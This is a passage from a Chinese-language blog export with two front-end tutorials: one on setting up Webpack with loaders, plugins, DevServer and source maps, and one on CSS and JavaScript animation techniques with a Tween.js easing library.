一切文件：JavaScript、CSS、SCSS、图片、模板，在 Webpack 眼中都是一个个模块，这样的好处是能清晰的描述出各个模块之间的依赖关系，以方便 Webpack 对模块进行组合和打包。 经过 Webpack 的处理，最终会输出浏览器能使用的静态资源。 Webpack的优点是： 专注于处理模块化的项目，能做到开箱即用一步到位； 通过 Plugin 扩展，完整好用又不失灵活； 使用场景不仅限于 Web 开发； 社区庞大活跃，经常引入紧跟时代发展的新特性，能为大多数场景找到已有的开源扩展；良好的开发体验。 Webpack的缺点是只能用于采用模块化开发的项目。 入门webpack安装在安装 Webpack 前请确保你的系统安装了5.0.0及以上版本的 Node.js。 新建一个项目在开始给项目加入构建前，你需要先新建一个 Web 项目，方式包括： 新建一个目录，再进入项目根目录执行 npm init 来初始化最简单的采用了模块化开发的项目； 用脚手架工具 Yeoman 直接快速地生成一个最符合你的需求的项目。 安装webpack到本地项目1npm install webpack --save-dev 安装完后你可以通过这些途径运行安装到本项目的 Webpack： 在项目根目录下对应的命令行里通过 node_modules/.bin/webpack 运行 Webpack 可执行文件。 在 Npm Script 里定义的任务会优先使用本项目下的 Webpack，代码如下： 123\"scripts\": &#123; \"start\": \"webpack --config webpack.config.js\"&#125; 安装webpack到全局1npm install webpack webpack-cli --save-dev-g 虽然介绍了以上两种安装方式，但是我们推荐安装到本项目，原因是可防止不同项目依赖不同版本的 Webpack 而导致冲突。 一个简单的示例下面通过 Webpack 构建一个采用 CommonJS 模块化编写的项目，该项目有个网页会通过 JavaScript 在网页中显示 Hello,Webpack。 首先我们按照上文步骤新建项目文件夹，并在该项目下安装webpack。 然后要完成该功能的最基础的 JavaScript 文件和 HTML 建立好，需要如下文件： 页面入口文件 index.html 12345678910&lt;html&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt;&lt;/head&gt;&lt;body&gt;&lt;div id=\"app\"&gt;&lt;/div&gt;&lt;!--导入 Webpack 输出的 JavaScript 文件--&gt;&lt;script src=\"./dist/bundle.js\"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; JS 工具函数文件 show.js 1234567// 操作 DOM 元素，把 content 显示到网页上function show(content) &#123; window.document.getElementById('app').innerText = 'Hello,' + content;&#125;// 通过 CommonJS 规范导出 show 函数module.exports = show; JS 执行入口文件 main.js 1234// 通过 CommonJS 规范导入 show 函数const show = require('./show.js');// 执行 show 函数show('Webpack'); Webpack 在执行构建时默认会从项目根目录下的 webpack.config.js 文件读取配置，所以你还需要新建它，其内容如下： 123456789101112const path = require('path');module.exports = &#123; // JavaScript 执行入口文件 entry: './main.js', output: &#123; // 把所有依赖的模块合并输出到一个 bundle.js 文件 filename: 'bundle.js', // 输出文件都放到 dist 目录下 path: path.resolve(__dirname, './dist'), &#125;&#125;; 由于 Webpack 构建运行在 Node.js 环境下，所以该文件最后需要通过 CommonJS 规范导出一个描述如何构建的 Object 对象。 此时项目目录如下： |– index.html|– main.js|– show.js|– webpack.config.js 一切文件就绪，在项目根目录下执行 webpack 命令运行 Webpack 构建，你会发现目录下多出一个 dist 目录，里面有个 bundle.js 文件， bundle.js 文件是一个可执行的 JavaScript 文件，它包含页面所依赖的两个模块 main.js 和 show.js 及内置的 webpackBootstrap 启动函数。 这时你用浏览器打开 index.html 网页将会看到 Hello,Webpack。 Webpack 是一个打包模块化 JavaScript 的工具，它会从 main.js 出发，识别出源码中的模块化导入语句， 递归的寻找出入口文件的所有依赖，把入口和其所有依赖打包到一个单独的文件中。 从 Webpack2 开始，已经内置了对 ES6、CommonJS、AMD 模块化语句的支持。 使用loader继续上一节的示例，这个时候我们要给hello，webpack这行文字添加样式，我们新建一个文件main.css，然后添加如下样式： 123#app &#123; text-align: center;&#125; Webpack 把一切文件看作模块，CSS 文件也不例外，要引入 main.css 需要像引入 JavaScript 文件那样，修改入口文件 main.js 如下：123456// 通过 CommonJS 规范导入 CSS 模块require('./main.css');// 通过 CommonJS 规范导入 show 函数const show = require('./show.js');// 执行 show 函数show('Webpack');如果这个时候直接手写require(‘./main.css’)，Webpack 构建是会报错的，因为 Webpack 不原生支持解析 CSS 文件。要支持非 JavaScript 类型的文件，需要使用 Webpack 的 Loader 机制 123456789101112131415161718192021const path = require('path');module.exports = &#123; // JavaScript 执行入口文件 entry: './main.js', output: &#123; // 把所有依赖的模块合并输出到一个 bundle.js 文件 filename: 'bundle.js', // 输出文件都放到 dist 目录下 path: path.resolve(__dirname, './dist'), &#125;, module: &#123; rules: [ &#123; // 用正则去匹配要用该 loader 转换的 CSS 文件 test: /\\.css$/, use: ['style-loader', 'css-loader?minimize'], &#125; ] &#125;&#125;; Loader 可以看作具有文件转换功能的翻译员，配置里的 module.rules 数组配置了一组规则，告诉 Webpack 在遇到哪些文件时使用哪些 Loader 去加载和转换。 如上配置告诉 Webpack 在遇到以 .css 结尾的文件时先使用 css-loader 读取 CSS 文件，再交给 style-loader 把 CSS 内容注入到 JavaScript 里。 在配置 Loader 时需要注意的是： use 属性的值需要是一个由 Loader 名称组成的数组，Loader 的执行顺序是由后到前的； 每一个 Loader 都可以通过 URL querystring 的方式传入参数，例如 css-loader?minimize 中的 minimize 告诉 css-loader 要开启 CSS 压缩。 想知道 Loader 具体支持哪些属性，则需要我们查阅文档，例如 css-loader 还有很多用法，我们可以在 css-loader 主页 上查到。 在重新执行 Webpack 构建前要先安装新引入的 Loader： 1npm install style-loader css-loader --save-dev 安装成功后重新执行构建时，你会发现 bundle.js 文件被更新了，里面注入了在 main.css 中写的 CSS，而不是会额外生成一个 CSS 文件。 但是重新刷新 index.html 网页时将会发现 Hello,Webpack 居中了，样式生效了！ 也许你会对此感到奇怪，第一次看到 CSS 被写在了 JavaScript 里！这其实都是 style-loader 的功劳，它的工作原理大概是把 CSS 内容用 JavaScript 里的字符串存储起来， 在网页执行 JavaScript 时通过 DOM 操作动态地往 HTML head 标签里插入 HTML style 标签。 也许你认为这样做会导致 JavaScript 文件变大并导致加载网页时间变长，想让 Webpack 单独输出 CSS 文件。下一节使用Plugin 将教你如何通过 Webpack Plugin 机制来实现。 给 Loader 传入属性的方式除了有 querystring 外，还可以通过 Object 传入，以上的 Loader 配置可以修改为如下： 123456789use: [ 'style-loader', &#123; loader:'css-loader', options:&#123; minimize:true, &#125; &#125;] 除了在 webpack.config.js 配置文件中配置 Loader 外，还可以在源码中指定用什么 Loader 去处理文件。 以加载 CSS 文件为例，修改上面例子中的 main.js 如下： 1require('style-loader!css-loader!./main.css'); 这样就能指定对 ./main.css 这个文件先采用 css-loader 再采用 style-loader 转换。 使用pluginPlugin 是用来扩展 Webpack 功能的，通过在构建流程里注入钩子实现，它给 Webpack 带来了很大的灵活性。 在上一节中通过 Loader 加载了 CSS 文件，本节将通过 Plugin 把注入到 bundle.js 文件里的 CSS 提取到单独的文件中，配置修改如下： 12345678910111213141516171819202122232425262728293031const path = require('path');const ExtractTextPlugin = require('extract-text-webpack-plugin');module.exports = &#123; // JavaScript 执行入口文件 entry: './main.js', output: &#123; // 把所有依赖的模块合并输出到一个 bundle.js 文件 filename: 'bundle.js', // 把输出文件都放到 dist 目录下 path: path.resolve(__dirname, './dist'), &#125;, module: &#123; rules: [ &#123; // 用正则去匹配要用该 loader 转换的 CSS 文件 test: /\\.css$/, use: ExtractTextPlugin.extract(&#123; // 转换 .css 文件需要使用的 Loader use: ['css-loader'], &#125;), &#125; ] &#125;, plugins: [ new ExtractTextPlugin(&#123; // 从 .js 文件中提取出来的 .css 文件的名称 filename: `[name]_[contenthash:8].css`, &#125;), ]&#125;; 同样的，在执行构建之前需要安装extract-text-webpack-plugin这个插件 需要注意的是，截止2020年7月27日，webpack已经到4.44版本，但是extract-text-webpack-plugin稳定版本依然不支持webpack4以上的版本，因此需要安装下一代版本 1npm install extract-text-webpack-plugin@next --save-dev 但是官方文档建议使用另外一个插件：mini-css-extract-plugin 使用DevServer DevServer 会启动一个 HTTP 服务器用于服务网页请求，同时会帮助启动 Webpack ，并接收 Webpack 发出的文件更变信号，通过 WebSocket 协议自动刷新网页做到实时预览。 下面为之前的小项目 Hello,Webpack 继续集成 DevServer。 首先需要安装 DevServer： 1npm i -D webpack-dev-server 安装成功后执行 webpack-dev-server 命令可以修改package.json文件使用npm启动： 12345\"scripts\": &#123; \"watch\": \"webpack --watch\", \"build\": \"webpack --config webpack.config.js\", \"start\": \"webpack-dev-server --open\"&#125;, 这时你会看到控制台有一串日志输出： 12Project is running at http://localhost:8080/webpack output is served from / 注意：为避免出现意外错误，需要格外注意各个依赖的版本兼容性。截止2020年7月28日，可正确运行的依赖版本如下： 123\"webpack\": \"^4.44.0\",\"webpack-dev-server\": \"3.7.1\",\"webpack-cli\": \"3.3.4\" 这意味着 DevServer 启动的 HTTP 服务器监听在 http://localhost:8080/ ，DevServer 启动后会一直驻留在后台保持运行，访问这个网址你就能获取项目根目录下的 index.html。 用浏览器打开这个地址你会发现页面空白错误原因是 ./dist/bundle.js 加载404了。 同时你会发现并没有文件输出到 dist 目录，原因是 DevServer 会把 Webpack 构建出的文件保存在内存中，在要访问输出的文件时，必须通过 HTTP 服务访问。 由于 DevServer 不会理会 webpack.config.js 里配置的 output.path 属性，所以要获取 bundle.js 的正确 URL 是 http://localhost:8080/bundle.js，对应的 index.html 应该修改为： 12345678910&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=\"app\"&gt;&lt;/div&gt; &lt;!--导入 DevServer 输出的 JavaScript 文件--&gt; &lt;script src=\"bundle.js\"&gt;&lt;/script&gt; &lt;/body&gt;&lt;/html&gt; 实时预览接着上面的步骤，你可以试试修改 main.js main.css show.js 中的任何一个文件，保存后你会发现浏览器会被自动刷新，运行出修改后的效果。 Webpack 在启动时可以开启监听模式，开启监听模式后 Webpack 会监听本地文件系统的变化，发生变化时重新构建出新的结果。Webpack 默认是关闭监听模式的，你可以在启动 Webpack 时通过 webpack –watch 来开启监听模式。 通过 DevServer 启动的 Webpack 会开启监听模式，当发生变化时重新执行完构建后通知 DevServer。 DevServer 会让 Webpack 在构建出的 JavaScript 代码里注入一个代理客户端用于控制网页，网页和 DevServer 之间通过 WebSocket 协议通信， 以方便 DevServer 主动向客户端发送命令。 DevServer 在收到来自 Webpack 的文件变化通知时通过注入的客户端控制网页刷新。 如果尝试修改 index.html 文件并保存，你会发现这并不会触发以上机制，导致这个问题的原因是 Webpack 在启动时会以配置里的 entry 为入口去递归解析出 entry 所依赖的文件，只有 entry 本身和依赖的文件才会被 Webpack 添加到监听列表里。 而 index.html 文件是脱离了 JavaScript 模块化系统的，所以 Webpack 不知道它的存在。 模块热替换除了通过重新刷新整个网页来实现实时预览，DevServer 还有一种被称作模块热替换的刷新技术。 模块热替换能做到在不重新加载整个网页的情况下，通过将被更新过的模块替换老的模块，再重新执行一次来实现实时预览。 模块热替换相对于默认的刷新机制能提供更快的响应和更好的开发体验。 模块热替换默认是关闭的，要开启模块热替换，你只需在启动 DevServer 时带上 –hot 参数，重启 DevServer 后再去更新文件就能体验到模块热替换的神奇了。 支持 Source Map在浏览器中运行的 JavaScript 代码都是编译器输出的代码，这些代码的可读性很差。如果在开发过程中遇到一个不知道原因的 Bug，则你可能需要通过断点调试去找出问题。 在编译器输出的代码上进行断点调试是一件辛苦和不优雅的事情。 例如，我在show.js里面随便写了一个bug：当我们到控制台调试时，就会发现这个尴尬的情况： 可以看到最终浏览器定位到了编译输出的文件，在体量比较庞大的项目中，想要依靠这个调试信息定位到源文件的具体出错的地方，可以说是非常困难的，此时我们就需要一些工具。 调试工具可以通过 Source Map 映射代码，让你在源代码上断点调试。 Webpack 支持生成 Source Map，只需在启动时带上 –devtool source-map 参数。 加上参数重启 DevServer 后刷新页面，再打开 Chrome 浏览器的开发者工具，就可在 Sources 栏中看到可调试的源代码了。 这个时候再来看：完美！！！ webpack-dev-server启动在线调试会自动开启Source Map 核心概念 Webpack 有以下几个核心概念。 Entry：入口，Webpack 执行构建的第一步将从 Entry 开始，可抽象成输入。 Module：模块，在 Webpack 里一切皆模块，一个模块对应着一个文件。Webpack 会从配置的 Entry 开始递归找出所有依赖的模块。 Chunk：代码块，一个 Chunk 由多个模块组合而成，用于代码合并与分割。 Loader：模块转换器，用于把模块原内容按照需求转换成新内容。 Plugin：扩展插件，在 Webpack 构建流程中的特定时机注入扩展逻辑来改变构建结果或做你想要的事情。 Output：输出结果，在 Webpack 经过一系列处理并得出最终想要的代码后输出结果。Webpack 启动后会从 Entry 里配置的 Module 开始递归解析 Entry 依赖的所有 Module。 每找到一个 Module， 就会根据配置的 Loader 去找出对应的转换规则，对 Module 进行转换后，再解析出当前 Module 依赖的 Module。 这些模块会以 Entry 为单位进行分组，一个 Entry 和其所有依赖的 Module 被分到一个组也就是一个 Chunk。最后 Webpack 会把所有 Chunk 转换成文件输出。 在整个流程中 Webpack 会在恰当的时机执行 Plugin 里定义的逻辑。 在实际应用中你可能会遇到各种奇怪复杂的场景，不知道从哪开始。 根据以上总结，你会对 Webpack 有一个整体的认识，这能让你在以后使用 Webpack 的过程中快速知道应该通过配置什么去完成你想要的功能，而不是无从下手。","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"前端","slug":"技术/前端","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/"},{"name":"webpack","slug":"技术/前端/webpack","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/webpack/"}],"tags":[]},{"title":"小话前端动画","slug":"小话前端动画","date":"2020-07-26T16:00:00.000Z","updated":"2024-05-25T04:21:29.360Z","comments":true,"path":"2020/07/27/小话前端动画/","link":"","permalink":"https://wtaufpziv.github.io/2020/07/27/%E5%B0%8F%E8%AF%9D%E5%89%8D%E7%AB%AF%E5%8A%A8%E7%94%BB/","excerpt":"前言在如今的web时代，网页中的动画已经成为web交互中必不可少的要素，小到一个按钮的点击，大到一个炫酷的特效，各路神圣大显神通，展示了web动画的无限可能，进而动画也就成了前端开发者不得不认真了解的一个领域。 就目前来看，前端实现动画就有六种方式： css的transition css的animation javascript利用setTimeout手写 requestAnimationFrames SVG Canvas 以上六种中，SVG由于CSS3的出现使用得越来越少了，而Canvas又是一个很庞大的领域，作为h5如今力压flash的王牌，canvas需要一定的额外学习成本。因此这篇文章将暂时不探讨这两种方式。 而剩下的四种方式，习惯上我们更容易想到，用transition和animation做比较，用setTimeout和requestAnimationFrames做比较，因此我们也已这样的角度，分别探究一下这四种方式的各个方面","text":"前言在如今的web时代，网页中的动画已经成为web交互中必不可少的要素，小到一个按钮的点击，大到一个炫酷的特效，各路神圣大显神通，展示了web动画的无限可能，进而动画也就成了前端开发者不得不认真了解的一个领域。 就目前来看，前端实现动画就有六种方式： css的transition css的animation javascript利用setTimeout手写 requestAnimationFrames SVG Canvas 以上六种中，SVG由于CSS3的出现使用得越来越少了，而Canvas又是一个很庞大的领域，作为h5如今力压flash的王牌，canvas需要一定的额外学习成本。因此这篇文章将暂时不探讨这两种方式。 而剩下的四种方式，习惯上我们更容易想到，用transition和animation做比较，用setTimeout和requestAnimationFrames做比较，因此我们也已这样的角度，分别探究一下这四种方式的各个方面 CSS阵营为什么css动画高效分层与合成在浏览器渲染原理中我们了解到，浏览器的渲染过程有回流和重绘。但是完整的一帧画面，实际上包括三个过程：重排、重绘、合成 Chrome中对于合成技术用上三个字可以概括：分层，分块，合成 为什么要引入分层与合成：当页面需要实现一些复杂的动画效果，从渲染树直接生成目标画面的话，由于涉及到的元素太多，一个微小的变化都可能引起页面的重排和重绘，严重影响页面的渲染效率。 为了解决这个问题，Chrome引入了分层与合成机制。 何为分层与合成对于这个概念，了解过学习过photoshop的就不难理解，你可以把一个网页想象成多个图片叠加在一起形成的，类似于ps中的图层的概念，而Chrome的合成器就是将这些图片合成最终显示的页面。 在此过程中，将页面分为多个图层的过程就称为分层，图层合并的过程称为合成。 Chrome如何实现分层与合成当渲染树生成时，渲染引擎会根据树的一些特点将其转换为层树，层树中每个节点对应的一个图层，因此绘制阶段并不是绘制真正的页面，而是绘制指令组合成为一个列表。那么什么情况下，渲染引擎会为元素创建新图层？ 拥有层叠上下文 文档根元素（&lt;html&gt;）； position 值为 absolute或 relative且 z-index 值不为 auto 的元素； position 值为 fixed（固定定位）或 sticky（粘滞定位）的元素 flex (flexbox) 容器的子元素，且 z-index 值不为 auto； grid (grid) 容器的子元素，且 z-index 值不为 auto； opacity 属性值小于 1 的元素（参见 the specification for opacity）； mix-blend-mode 属性值不为 normal 的元素； 以下任意属性值不为 none 的元素：transformfilterperspectiveclip-pathmask / mask-image / mask-border isolation 属性值为 isolate 的元素； -webkit-overflow-scrolling 属性值为 touch 的元素； will-change 值设定了任一属性而该属性在 non-initial 值时会创建层叠上下文的元素 contain 属性值为 layout、paint 或包含它们其中之一的合成值（比如 contain: strict、contain: content）的元素。 需要裁剪的地方例如：文字内容比较多，超出了显示区域。 那么所谓的合成，其实也就可以理解为，原本需要由浏览器计算并绘制完成的完整页面，然后交给GPU显示，变成了浏览器只绘制渲染层页面，此时交给GPU的页面是不完整的，剩下的合成层需要由GPU计算并绘制，并最终显示到屏幕上。 所以就可以理解为什么css3中动画、fixed元素（好好理解一下，get到那个点），canvas/video/iframe等等都交给了合成层由GPU去绘制 而对于合成操作，实在合成线程上完成且由GPU计算的，这意味着在进行合成操作时，是不会影响到主线程的，这也是css动画高效的一个主要原因。 分块如果说分层是从宏观上提升了渲染效率,那么分块则是从微观层面提升了渲染效率。 通常情况下，页面内容远大于屏幕大小。如果等所有图层都生成完毕再合成，会让合成图片的时间变得更久。 因此合成线程会将每个图层分为大小固定的图块，然后优先绘制靠近视口的图块，这样就可以加速页面显示速度。不过，有时即使只绘制优先级高的图块，也要耗费不少时间，因为中间涉及到纹理上传，从计算机内存.上传到GPU内存的操作会比较慢。 为了解决这个问题，Chrome 在首次合成图块的时候使用一个低分辨率的图片。 分辨率减少-半,纹理就减少了四分之三。首次展示页面时，展示低分辨率图片，然后合成器继续绘制正常比例的页面内容，当绘制完成后，再替换掉当前显示的低分辨率内容。 利用分层技术优化代码如果要对某个元素做几何形状变化、透明度变换或者缩放，可以使用will-change告诉渲染引擎,如下: 1.box &#123; will-change: transform, opacity; &#125; will-change会提前告诉渲染引擎box元素要做几何变换和透明度变换操作，这是渲染引擎会将该元素单独实现一层，等变换发生时，渲染引擎会通过合成线程直接处理变换，此变换不涉及主线程，故效率高。 注意点: will-change会让渲染引擎为该元素准备独立层，占用的内存也会大大增加，因为从层树开始，后续每个阶段都会多一个层结构，都需要额外内存。 transition、transform、animation假设我们将一个页面元素的高度从100px渐变到200px transition做动画时两个线程的工作情况是：对于浏览器来说，元素的高度一直在变化，因此这个动画的每一帧都需要主线程对元素进行布局，绘制成位图，将位图交由GPU线程，GPU将位图绘制到屏幕。两个线程来回切换工作，即使是移动十几个像素，主线程也需要对元素布局很多次，这部分的工作消耗相当大，相对较慢，这也是transition动画经常卡顿的原因。 12345678div &#123; height: 100px; transition: height 1s linear;&#125;div:hover &#123; height: 200px;&#125; 使用transform时浏览器的工作情况是：主线程对元素进行布局，绘制成位图，交由GPU线程，transform执行的整个过程都在GPU进程执行绘制，两个线程来回切换的情况不多，而且transform不会触发浏览器的重新排版，不会影响周围的布局，这也意味着这种情况的动画比transition流畅一些。 1234567div &#123; transform: scale(0.5); transition: transform 1s linear;&#125;div:hover &#123; transform: scale(1.0);&#125; 而animation几乎做到了transform那样的性能，只不过从一定程度上来讲，animation要更消耗性能，由于关键帧的引入，使得animation足以应付很多复杂的动画效果 与 transition 不同的是，keyframes提供更多的控制，尤其是时间轴的控制，这点让css animation更加强大，使得flash的部分动画效果可以由css直接控制完成，而这一切，仅仅只需要几行代码，也因此诞生了大量（比起flash来说算是大量了）基于css的animation tools，用来取代flash的动画部分。 JS阵营众所周知，现在我们的大部分屏幕刷新率都是60hz（别跟我提什么120hz电竞屏，切图仔不吃这一套）。在通常情况下，当动画能够到达60帧时就能够给人以流畅的体验，于是就出现了setTimeout和setInterval的动画实现方案，即每16ms执行一次回调函数，在回调函数中像素级别地修改目标元素的而样式，手动控制动画的开始和停止。 可能有人会觉得，那我把函数的时间间隔设置短一点，是不是就可以把帧率提得更高了呢? 然而。。。。 相当一部分的浏览器的显示频率是16.7ms, 就是上图第一行的节奏，表现就是“我和你一步两步三步四步往前走……”。如果我们火力搞猛一点，例如搞个10ms setTimeout，就会是下面一行的模样——每第三个图形都无法绘制（红色箭头指示），表现就是“我和你一步两步 坑 四步往前走……”。也就是说如果你设置的间隔和用户屏幕刷新率不是整除型匹配，这样做反而会产生卡顿。 那么使用setTimeout有没有其他问题呢？ 当然有，学习了浏览器的事件循环event loop机制我们可以回想到，setTimeout和setInterval在浏览器中是宏任务，而一次event loop循环中，只有浏览器执行完主线程任务和微任务队列的任务，才会从宏队列中拿出setTimeout和setInterval回调函数中的任务去执行。这意味着，如果在16ms内浏览器没能执行完主线程和微队列上的任务，那么就无法保证每16ms稳定执行setTime和setInterval的回调函数，无法做到60帧的帧率，那么自然我们的动画就发生了卡顿。 requestAnimationFrames针对上述两个问题，raf都分别有自己的解决方案 首先对于第一个刷新间隔的问题：requestAnimationFrame所做的事情很简单，跟着浏览器的绘制走，如果浏览设备绘制间隔是16.7ms，那就这个间隔绘制；如果浏览设备绘制间隔是10ms, 就10ms绘制。这样就不会存在过度绘制的问题，动画不会掉帧，自然流畅的说~~ 而对于第二个问题：浏览器（如页面）每次要重绘，就会通知requestAnimationFrame：老铁，我要重绘了，你可以执行你内部的函数了！ 这是资源非常高效的一种利用方式。怎么讲呢？ 就算很多个raf，浏览器只要通知一次就可以了。而setTimeout貌似是多个独立绘制。 页面最小化了，或者被Tab切换关灯了。页面是不会重绘的，自然，raf的执行也就停止了。页面绘制全部停止，资源高效利用。 raf的优势优秀的兼容性虽然说目前对于IE8和IE9，开发者们已经几乎不放什么心思在做他们的兼容性上了，但是你不得不承认的是，这货如今依然有大量的用户和机构在使用。 对于一些动画，可以使用CSS3实现，但是由于要考虑兼容性，不得不用setTimeout再去实现一遍。然而，raf表示：这都不是个事儿。 requestAnimationFrame跟setTimeout非常类似，都是单回调，用法也类似。 12var handle = setTimeout(renderLoop, PERIOD);var handle = requestAnimationFrame(renderLoop); 而requestAnimationFrame调用一次只会重绘一次动画 一些css不能做到的动画使用CSS3动画可以改变高宽，方位，角度，透明度等等。但是，就像六道带土也有弱点一样，CSS3动画也有属性鞭长莫及。比方说scrollTop值。如果我们希望返回顶部是个平滑滚动效果，就目前而言，CSS3似乎是无能为力的。此时，还是要JS出马 css支持的动画效果有限由于CSS3动画的贝塞尔曲线是一个标准3次方曲线（详见：animation-timing-function），因此，只能是：Linear, Sine, Quad, Cubic, Expo等，但对于Back, Bounce等缓动则只可观望而不可亵玩焉。 像这些复杂的动画，css3是无法实现的 注：事实上，css3已经有cubic-bezier属性，可以设置贝塞尔曲线；而关于缓动（Tween），有下面这些形式： Linear：无缓动效果 Quadratic：二次方的缓动（t^2） Cubic：三次方的缓动（t^3） Quartic：四次方的缓动（t^4） Quintic：五次方的缓动（t^5） Sinusoidal：正弦曲线的缓动（sin(t)） Exponential：指数曲线的缓动（2^t） Circular：圆形曲线的缓动（sqrt(1-t^2)） Elastic：指数衰减的正弦曲线缓动 超过范围的三次方缓动（(s+1)t^3 – st^2） 指数衰减的反弹缓动 每个效果都分三个缓动方式，分别是： easeIn：从0开始加速的缓动； easeOut：减速到0的缓动； easeInOut：前半段从0开始加速，后半段减速到0的缓动。 Tween算法： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176/* * Tween.js * t: current time（当前时间） * b: beginning value（初始值） * c: change in value（变化量） * d: duration（持续时间）*/var Tween = &#123; Linear: function(t, b, c, d) &#123; return c*t/d + b; &#125;, Quad: &#123; easeIn: function(t, b, c, d) &#123; return c * (t /= d) * t + b; &#125;, easeOut: function(t, b, c, d) &#123; return -c *(t /= d)*(t-2) + b; &#125;, easeInOut: function(t, b, c, d) &#123; if ((t /= d / 2) &lt; 1) return c / 2 * t * t + b; return -c / 2 * ((--t) * (t-2) - 1) + b; &#125; &#125;, Cubic: &#123; easeIn: function(t, b, c, d) &#123; return c * (t /= d) * t * t + b; &#125;, easeOut: function(t, b, c, d) &#123; return c * ((t = t/d - 1) * t * t + 1) + b; &#125;, easeInOut: function(t, b, c, d) &#123; if ((t /= d / 2) &lt; 1) return c / 2 * t * t*t + b; return c / 2*((t -= 2) * t * t + 2) + b; &#125; &#125;, Quart: &#123; easeIn: function(t, b, c, d) &#123; return c * (t /= d) * t * t*t + b; &#125;, easeOut: function(t, b, c, d) &#123; return -c * ((t = t/d - 1) * t * t*t - 1) + b; &#125;, easeInOut: function(t, b, c, d) &#123; if ((t /= d / 2) &lt; 1) return c / 2 * t * t * t * t + b; return -c / 2 * ((t -= 2) * t * t*t - 2) + b; &#125; &#125;, Quint: &#123; easeIn: function(t, b, c, d) &#123; return c * (t /= d) * t * t * t * t + b; &#125;, easeOut: function(t, b, c, d) &#123; return c * ((t = t/d - 1) * t * t * t * t + 1) + b; &#125;, easeInOut: function(t, b, c, d) &#123; if ((t /= d / 2) &lt; 1) return c / 2 * t * t * t * t * t + b; return c / 2*((t -= 2) * t * t * t * t + 2) + b; &#125; &#125;, Sine: &#123; easeIn: function(t, b, c, d) &#123; return -c * Math.cos(t/d * (Math.PI/2)) + c + b; &#125;, easeOut: function(t, b, c, d) &#123; return c * Math.sin(t/d * (Math.PI/2)) + b; &#125;, easeInOut: function(t, b, c, d) &#123; return -c / 2 * (Math.cos(Math.PI * t/d) - 1) + b; &#125; &#125;, Expo: &#123; easeIn: function(t, b, c, d) &#123; return (t==0) ? b : c * Math.pow(2, 10 * (t/d - 1)) + b; &#125;, easeOut: function(t, b, c, d) &#123; return (t==d) ? b + c : c * (-Math.pow(2, -10 * t/d) + 1) + b; &#125;, easeInOut: function(t, b, c, d) &#123; if (t==0) return b; if (t==d) return b+c; if ((t /= d / 2) &lt; 1) return c / 2 * Math.pow(2, 10 * (t - 1)) + b; return c / 2 * (-Math.pow(2, -10 * --t) + 2) + b; &#125; &#125;, Circ: &#123; easeIn: function(t, b, c, d) &#123; return -c * (Math.sqrt(1 - (t /= d) * t) - 1) + b; &#125;, easeOut: function(t, b, c, d) &#123; return c * Math.sqrt(1 - (t = t/d - 1) * t) + b; &#125;, easeInOut: function(t, b, c, d) &#123; if ((t /= d / 2) &lt; 1) return -c / 2 * (Math.sqrt(1 - t * t) - 1) + b; return c / 2 * (Math.sqrt(1 - (t -= 2) * t) + 1) + b; &#125; &#125;, Elastic: &#123; easeIn: function(t, b, c, d, a, p) &#123; var s; if (t==0) return b; if ((t /= d) == 1) return b + c; if (typeof p == \"undefined\") p = d * .3; if (!a || a &lt; Math.abs(c)) &#123; s = p / 4; a = c; &#125; else &#123; s = p / (2 * Math.PI) * Math.asin(c / a); &#125; return -(a * Math.pow(2, 10 * (t -= 1)) * Math.sin((t * d - s) * (2 * Math.PI) / p)) + b; &#125;, easeOut: function(t, b, c, d, a, p) &#123; var s; if (t==0) return b; if ((t /= d) == 1) return b + c; if (typeof p == \"undefined\") p = d * .3; if (!a || a &lt; Math.abs(c)) &#123; a = c; s = p / 4; &#125; else &#123; s = p/(2*Math.PI) * Math.asin(c/a); &#125; return (a * Math.pow(2, -10 * t) * Math.sin((t * d - s) * (2 * Math.PI) / p) + c + b); &#125;, easeInOut: function(t, b, c, d, a, p) &#123; var s; if (t==0) return b; if ((t /= d / 2) == 2) return b+c; if (typeof p == \"undefined\") p = d * (.3 * 1.5); if (!a || a &lt; Math.abs(c)) &#123; a = c; s = p / 4; &#125; else &#123; s = p / (2 *Math.PI) * Math.asin(c / a); &#125; if (t &lt; 1) return -.5 * (a * Math.pow(2, 10* (t -=1 )) * Math.sin((t * d - s) * (2 * Math.PI) / p)) + b; return a * Math.pow(2, -10 * (t -= 1)) * Math.sin((t * d - s) * (2 * Math.PI) / p ) * .5 + c + b; &#125; &#125;, Back: &#123; easeIn: function(t, b, c, d, s) &#123; if (typeof s == \"undefined\") s = 1.70158; return c * (t /= d) * t * ((s + 1) * t - s) + b; &#125;, easeOut: function(t, b, c, d, s) &#123; if (typeof s == \"undefined\") s = 1.70158; return c * ((t = t/d - 1) * t * ((s + 1) * t + s) + 1) + b; &#125;, easeInOut: function(t, b, c, d, s) &#123; if (typeof s == \"undefined\") s = 1.70158; if ((t /= d / 2) &lt; 1) return c / 2 * (t * t * (((s *= (1.525)) + 1) * t - s)) + b; return c / 2*((t -= 2) * t * (((s *= (1.525)) + 1) * t + s) + 2) + b; &#125; &#125;, Bounce: &#123; easeIn: function(t, b, c, d) &#123; return c - Tween.Bounce.easeOut(d-t, 0, c, d) + b; &#125;, easeOut: function(t, b, c, d) &#123; if ((t /= d) &lt; (1 / 2.75)) &#123; return c * (7.5625 * t * t) + b; &#125; else if (t &lt; (2 / 2.75)) &#123; return c * (7.5625 * (t -= (1.5 / 2.75)) * t + .75) + b; &#125; else if (t &lt; (2.5 / 2.75)) &#123; return c * (7.5625 * (t -= (2.25 / 2.75)) * t + .9375) + b; &#125; else &#123; return c * (7.5625 * (t -= (2.625 / 2.75)) * t + .984375) + b; &#125; &#125;, easeInOut: function(t, b, c, d) &#123; if (t &lt; d / 2) &#123; return Tween.Bounce.easeIn(t * 2, 0, c, d) * .5 + b; &#125; else &#123; return Tween.Bounce.easeOut(t * 2 